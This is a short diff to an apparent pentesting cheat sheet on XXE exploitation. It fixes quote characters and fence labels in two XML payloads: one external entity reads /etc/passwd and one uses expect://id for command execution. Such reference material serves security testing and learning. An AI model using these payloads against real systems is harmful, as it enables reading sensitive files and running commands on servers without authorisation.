@@ -5,12 +5,12 @@
 
 ## Exploitation
 - LFI
-```xml
+```XML
 <!DOCTYPE foo[
-<!Entity xxe SYSTEM “file:///etc/passwd”>]>
+<!Entity xxe SYSTEM "file:///etc/passwd">]>
 <foo>&xxe;</foo>
 ```
 - Command Injection
-```xml
-<!Entity xxe SYSTEM “expect://id”>]>
+```XML
+<!Entity xxe SYSTEM "expect://id">]>
 ```
